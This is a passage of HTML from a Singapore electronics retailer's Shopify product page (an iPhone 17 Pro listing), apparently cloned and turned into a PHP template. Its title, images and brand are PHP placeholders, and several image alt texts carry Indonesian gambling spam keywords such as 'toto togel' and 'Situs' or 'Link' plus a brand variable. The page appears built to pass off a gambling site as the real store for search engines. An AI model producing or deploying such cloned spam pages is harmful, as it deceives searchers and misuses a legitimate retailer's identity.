-                data-section="template--17605519376564__main"
-                >
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/section-main-product.css?v=106354761565452021941742784887" rel="stylesheet" type="text/css" media="all" />
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-accordion.css?v=114305622551526091581742784887" rel="stylesheet" type="text/css" media="all" />
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-price.css?v=89212854351592844731742784887" rel="stylesheet" type="text/css" media="all" />
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-slider.css?v=102975581670085299341742784888" rel="stylesheet" type="text/css" media="all" />
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-rating.css?v=157771854592137137841742784889" rel="stylesheet" type="text/css" media="all" />
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-loading-overlay.css?v=160031540023746741091742784889" rel="stylesheet" type="text/css" media="all" />
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-deferred-media.css?v=14096082462203297471742784888" rel="stylesheet" type="text/css" media="all" />
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/custom-style.css?v=128650136086380557481742784888" rel="stylesheet" type="text/css" media="all" />
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/collapsecon.css?v=55192844502193137581742784889" rel="stylesheet" type="text/css" media="all" />
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/productMarketingContent.css?v=134348870364535945721742784887" rel="stylesheet" type="text/css" media="all" />
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/fancybox-3-5-7.css?v=48221248546321444771742784887" rel="stylesheet" type="text/css" media="all" />
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-trade-in-sellto.css?v=107184028641227493051757586003" rel="stylesheet" type="text/css" media="all" />
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-trade-in-dialog.css?v=16175248172835987831757430081" rel="stylesheet" type="text/css" media="all" />
-                <style data-shopify>.section-template--17605519376564__main-padding {
-                    padding-top: 27px;
-                    padding-bottom: 9px;
-                    }
-                    @media screen and (min-width: 750px) {
-                    .section-template--17605519376564__main-padding {
-                    padding-top: 36px;
-                    padding-bottom: 12px;
-                    }
-                    }
-                </style>
-                <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/google_analytics_finacing.js?v=123767470501580560631742784889" defer="defer"></script>
-                <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/product-info.js?v=68469288658591082901742784888" defer="defer"></script>
-                <div class="product product--large product--left product--stacked product--mobile-hide grid grid--1-col grid--2-col-tablet">
-                    <div class="product-page-width mobile-view_product-title">
-                      <div class="priceAndLabelTag">
-                          <div class="product_tag_display_container">
-                            <span class="product_tag_display" style="color:#168edf;">NEW</span>
-                          </div>
-                      </div>
-                      <div class="product-title-style product__title" >
-                          <h1><?= $title; ?></h1>
-                      </div>
-                      <div class="product-subtitle-style"></div>
-                      <div class="skuAndBarcode">
-                          <span class="sku-pdp" id="skumob-template--17605519376564__main">
-                          <span id="skutitle1">
-                          SKU: </span>9484875120</span>
-                          <span class="barcode-pdp" id="barcmob-template--17605519376564__main">
-                          <label id="barcodetitle1"  >
-                          Barcode:</label>
-                          <span class="barcodeinput" id="main-pro-barcode-mobile">9484875120</span>
-                          </span>
-                      </div>
-                      <p class="product__preorder-message"></p>
-                    </div>
-                    <div class="grid__item product__media-wrapper">
-                      <media-gallery
-                          id="MediaGallery-template--17605519376564__main"
-                          role="region"
-                          class="product__media-gallery product-custom-media"
-                          aria-label="Gallery Viewer"
-                          data-desktop-layout="stacked"
-                          >
-                          <div id="GalleryStatus-template--17605519376564__main" class="visually-hidden" role="status"></div>
-                          <slider-component id="GalleryViewer-template--17605519376564__main" class="slider-mobile-gutter">
-                            <a class="skip-to-content-link button visually-hidden quick-add-hidden" href="#ProductInfo-template--17605519376564__main">
-                            Skip to product information
-                            </a>
-                            <ul
-                                id="Slider-Gallery-template--17605519376564__main"
-                                class="product__media-list contains-media grid grid--peek list-unstyled slider slider--mobile"
-                                >
-                                <li
-                                  id="Slide-template--17605519376564__main-32122040123572"
-                                  class="common_medias variant-comapre-image- variant-all-image product__media-item grid__item slider__slide is-active"
-                                  data-media-id="template--17605519376564__main-32122040123572"
-                                  >
-                                  <div
-                                      class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height"
-                                      style="--ratio: 1.0; --preview-ratio: 1.0;"
-                                      >
-                                      <modal-opener class="product__modal-opener product__modal-opener--image no-js-hidden" data-modal="#ProductModal-template--17605519376564__main">
-                                        <span class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox" aria-hidden="true">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="icon icon-plus"
-                                              width="19"
-                                              height="19"
-                                              viewBox="0 0 19 19"
-                                              fill="none"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z" fill="currentColor"/>
-                                            </svg>
-                                        </span>
-                                        <div class="loading-overlay__spinner hidden">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="spinner"
-                                              viewBox="0 0 66 66"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <circle class="path" fill="none" stroke-width="4" cx="33" cy="33" r="30"></circle>
-                                            </svg>
-                                        </div>
-                                        <div class="product__media media media--transparent">
-                                            <img src="<?= $image; ?>?v=1757450054&amp;width=823" alt="<?= $title; ?>" srcset="<?= $image; ?>?v=1757450054&amp;width=246 246w, <?= $image; ?>?v=1757450054&amp;width=493 493w, <?= $image; ?>?v=1757450054&amp;width=600 600w, <?= $image; ?>?v=1757450054&amp;width=713 713w, <?= $image; ?>?v=1757450054&amp;width=823 823w" width="823" height="823" class="image-magnify-lightbox" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
-                                        </div>
-                                        <button class="product__media-toggle quick-add-hidden product__media-zoom-lightbox" type="button" aria-haspopup="dialog" data-media-id="32122040123572">
-                                        <span class="visually-hidden">
-                                        Open media 1 in modal
-                                        </span>
-                                        </button>
-                                      </modal-opener>
-                                  </div>
-                                </li>
-                                <li
-                                  id="Slide-template--17605519376564__main-32122040156340"
-                                  class="common_medias variant-comapre-image- variant-all-image product__media-item grid__item slider__slide"
-                                  data-media-id="template--17605519376564__main-32122040156340"
-                                  >
-                                  <div
-                                      class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height"
-                                      style="--ratio: 1.0; --preview-ratio: 1.0;"
-                                      >
-                                      <modal-opener class="product__modal-opener product__modal-opener--image no-js-hidden" data-modal="#ProductModal-template--17605519376564__main">
-                                        <span class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox" aria-hidden="true">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="icon icon-plus"
-                                              width="19"
-                                              height="19"
-                                              viewBox="0 0 19 19"
-                                              fill="none"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z" fill="currentColor"/>
-                                            </svg>
-                                        </span>
-                                        <div class="loading-overlay__spinner hidden">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="spinner"
-                                              viewBox="0 0 66 66"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <circle class="path" fill="none" stroke-width="4" cx="33" cy="33" r="30"></circle>
-                                            </svg>
-                                        </div>
-                                        <div class="product__media media media--transparent">
-                                            <img src="<?= $image; ?>?v=1757450054&amp;width=823" alt="iPhone_17_Pro_Cosmic_Orange_PDP_Image_Position_2_Cosmic_Orange_Colour__SG-EN" srcset="<?= $image; ?>?v=1757450054&amp;width=246 246w, <?= $image; ?>?v=1757450054&amp;width=493 493w, <?= $image; ?>?v=1757450054&amp;width=600 600w, <?= $image; ?>?v=1757450054&amp;width=713 713w, <?= $image; ?>?v=1757450054&amp;width=823 823w" width="823" height="823" loading="lazy" class="image-magnify-lightbox" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
-                                        </div>
-                                        <button class="product__media-toggle quick-add-hidden product__media-zoom-lightbox" type="button" aria-haspopup="dialog" data-media-id="32122040156340">
-                                        <span class="visually-hidden">
-                                        Open media 2 in modal
-                                        </span>
-                                        </button>
-                                      </modal-opener>
-                                  </div>
-                                </li>
-                                <li
-                                  id="Slide-template--17605519376564__main-32122040189108"
-                                  class="common_medias variant-comapre-image- variant-all-image product__media-item grid__item slider__slide"
-                                  data-media-id="template--17605519376564__main-32122040189108"
-                                  >
-                                  <div
-                                      class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height"
-                                      style="--ratio: 1.0; --preview-ratio: 1.0;"
-                                      >
-                                      <modal-opener class="product__modal-opener product__modal-opener--image no-js-hidden" data-modal="#ProductModal-template--17605519376564__main">
-                                        <span class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox" aria-hidden="true">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="icon icon-plus"
-                                              width="19"
-                                              height="19"
-                                              viewBox="0 0 19 19"
-                                              fill="none"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z" fill="currentColor"/>
-                                            </svg>
-                                        </span>
-                                        <div class="loading-overlay__spinner hidden">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="spinner"
-                                              viewBox="0 0 66 66"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <circle class="path" fill="none" stroke-width="4" cx="33" cy="33" r="30"></circle>
-                                            </svg>
-                                        </div>
-                                        <div class="product__media media media--transparent">
-                                            <img src="<?= $image; ?>?v=1757450055&amp;width=823" alt="<?= $BRAND; ?>" srcset="<?= $image; ?>?v=1757450055&amp;width=246 246w, <?= $image; ?>?v=1757450055&amp;width=493 493w, <?= $image; ?>?v=1757450055&amp;width=600 600w, <?= $image; ?>?v=1757450055&amp;width=713 713w, <?= $image; ?>?v=1757450055&amp;width=823 823w" width="823" height="823" loading="lazy" class="image-magnify-lightbox" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
-                                        </div>
-                                        <button class="product__media-toggle quick-add-hidden product__media-zoom-lightbox" type="button" aria-haspopup="dialog" data-media-id="32122040189108">
-                                        <span class="visually-hidden">
-                                        Open media 3 in modal
-                                        </span>
-                                        </button>
-                                      </modal-opener>
-                                  </div>
-                                </li>
-                                <li
-                                  id="Slide-template--17605519376564__main-32122040221876"
-                                  class="common_medias variant-comapre-image- variant-all-image product__media-item grid__item slider__slide"
-                                  data-media-id="template--17605519376564__main-32122040221876"
-                                  >
-                                  <div
-                                      class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height"
-                                      style="--ratio: 1.0; --preview-ratio: 1.0;"
-                                      >
-                                      <modal-opener class="product__modal-opener product__modal-opener--image no-js-hidden" data-modal="#ProductModal-template--17605519376564__main">
-                                        <span class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox" aria-hidden="true">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="icon icon-plus"
-                                              width="19"
-                                              height="19"
-                                              viewBox="0 0 19 19"
-                                              fill="none"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z" fill="currentColor"/>
-                                            </svg>
-                                        </span>
-                                        <div class="loading-overlay__spinner hidden">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="spinner"
-                                              viewBox="0 0 66 66"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <circle class="path" fill="none" stroke-width="4" cx="33" cy="33" r="30"></circle>
-                                            </svg>
-                                        </div>
-                                        <div class="product__media media media--transparent">
-                                            <img src="<?= $image; ?>?v=1757450054&amp;width=823" alt="<?= $BRAND; ?> Terpercaya" srcset="<?= $image; ?>?v=1757450054&amp;width=246 246w, <?= $image; ?>?v=1757450054&amp;width=493 493w, <?= $image; ?>?v=1757450054&amp;width=600 600w, <?= $image; ?>?v=1757450054&amp;width=713 713w, <?= $image; ?>?v=1757450054&amp;width=823 823w" width="823" height="823" loading="lazy" class="image-magnify-lightbox" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
-                                        </div>
-                                        <button class="product__media-toggle quick-add-hidden product__media-zoom-lightbox" type="button" aria-haspopup="dialog" data-media-id="32122040221876">
-                                        <span class="visually-hidden">
-                                        Open media 4 in modal
-                                        </span>
-                                        </button>
-                                      </modal-opener>
-                                  </div>
-                                </li>
-                                <li
-                                  id="Slide-template--17605519376564__main-32122040254644"
-                                  class="common_medias variant-comapre-image- variant-all-image product__media-item grid__item slider__slide"
-                                  data-media-id="template--17605519376564__main-32122040254644"
-                                  >
-                                  <div
-                                      class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height"
-                                      style="--ratio: 1.0; --preview-ratio: 1.0;"
-                                      >
-                                      <modal-opener class="product__modal-opener product__modal-opener--image no-js-hidden" data-modal="#ProductModal-template--17605519376564__main">
-                                        <span class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox" aria-hidden="true">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="icon icon-plus"
-                                              width="19"
-                                              height="19"
-                                              viewBox="0 0 19 19"
-                                              fill="none"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z" fill="currentColor"/>
-                                            </svg>
-                                        </span>
-                                        <div class="loading-overlay__spinner hidden">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="spinner"
-                                              viewBox="0 0 66 66"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <circle class="path" fill="none" stroke-width="4" cx="33" cy="33" r="30"></circle>
-                                            </svg>
-                                        </div>
-                                        <div class="product__media media media--transparent">
-                                            <img src="<?= $image; ?>?v=1757450054&amp;width=823" alt="Situs <?= $BRAND; ?>" srcset="<?= $image; ?>?v=1757450054&amp;width=246 246w, <?= $image; ?>?v=1757450054&amp;width=493 493w, <?= $image; ?>?v=1757450054&amp;width=600 600w, <?= $image; ?>?v=1757450054&amp;width=713 713w, <?= $image; ?>?v=1757450054&amp;width=823 823w" width="823" height="823" loading="lazy" class="image-magnify-lightbox" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
-                                        </div>
-                                        <button class="product__media-toggle quick-add-hidden product__media-zoom-lightbox" type="button" aria-haspopup="dialog" data-media-id="32122040254644">
-                                        <span class="visually-hidden">
-                                        Open media 5 in modal
-                                        </span>
-                                        </button>
-                                      </modal-opener>
-                                  </div>
-                                </li>
-                                <li
-                                  id="Slide-template--17605519376564__main-32122040287412"
-                                  class="common_medias variant-comapre-image- variant-all-image product__media-item grid__item slider__slide"
-                                  data-media-id="template--17605519376564__main-32122040287412"
-                                  >
-                                  <div
-                                      class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height"
-                                      style="--ratio: 1.0; --preview-ratio: 1.0;"
-                                      >
-                                      <modal-opener class="product__modal-opener product__modal-opener--image no-js-hidden" data-modal="#ProductModal-template--17605519376564__main">
-                                        <span class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox" aria-hidden="true">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="icon icon-plus"
-                                              width="19"
-                                              height="19"
-                                              viewBox="0 0 19 19"
-                                              fill="none"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z" fill="currentColor"/>
-                                            </svg>
-                                        </span>
-                                        <div class="loading-overlay__spinner hidden">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="spinner"
-                                              viewBox="0 0 66 66"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <circle class="path" fill="none" stroke-width="4" cx="33" cy="33" r="30"></circle>
-                                            </svg>
-                                        </div>
-                                        <div class="product__media media media--transparent">
-                                            <img src="<?= $image; ?>?v=1757450054&amp;width=823" alt="Link <?= $BRAND; ?>" srcset="<?= $image; ?>?v=1757450054&amp;width=246 246w, <?= $image; ?>?v=1757450054&amp;width=493 493w, <?= $image; ?>?v=1757450054&amp;width=600 600w, <?= $image; ?>?v=1757450054&amp;width=713 713w, <?= $image; ?>?v=1757450054&amp;width=823 823w" width="823" height="823" loading="lazy" class="image-magnify-lightbox" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
-                                        </div>
-                                        <button class="product__media-toggle quick-add-hidden product__media-zoom-lightbox" type="button" aria-haspopup="dialog" data-media-id="32122040287412">
-                                        <span class="visually-hidden">
-                                        Open media 6 in modal
-                                        </span>
-                                        </button>
-                                      </modal-opener>
-                                  </div>
-                                </li>
-                                <li
-                                  id="Slide-template--17605519376564__main-32122040320180"
-                                  class="common_medias variant-comapre-image- variant-all-image product__media-item grid__item slider__slide"
-                                  data-media-id="template--17605519376564__main-32122040320180"
-                                  >
-                                  <div
-                                      class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height"
-                                      style="--ratio: 1.0; --preview-ratio: 1.0;"
-                                      >
-                                      <modal-opener class="product__modal-opener product__modal-opener--image no-js-hidden" data-modal="#ProductModal-template--17605519376564__main">
-                                        <span class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox" aria-hidden="true">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="icon icon-plus"
-                                              width="19"
-                                              height="19"
-                                              viewBox="0 0 19 19"
-                                              fill="none"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z" fill="currentColor"/>
-                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z" fill="currentColor"/>
-                                            </svg>
-                                        </span>
-                                        <div class="loading-overlay__spinner hidden">
-                                            <svg
-                                              aria-hidden="true"
-                                              focusable="false"
-                                              class="spinner"
-                                              viewBox="0 0 66 66"
-                                              xmlns="http://www.w3.org/2000/svg"
-                                              >
-                                              <circle class="path" fill="none" stroke-width="4" cx="33" cy="33" r="30"></circle>
-                                            </svg>
-                                        </div>
-                                        <div class="product__media media media--transparent">
-                                            <img src="<?= $image; ?>?v=1757450054&amp;width=823" alt="toto togel" srcset="<?= $image; ?>?v=1757450054&amp;width=246 246w, <?= $image; ?>?v=1757450054&amp;width=493 493w, <?= $image; ?>?v=1757450054&amp;width=600 600w, <?= $image; ?>?v=1757450054&amp;width=713 713w, <?= $image; ?>?v=1757450054&amp;width=823 823w" width="823" height="823" loading="lazy" class="image-magnify-lightbox" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
-                                        </div>
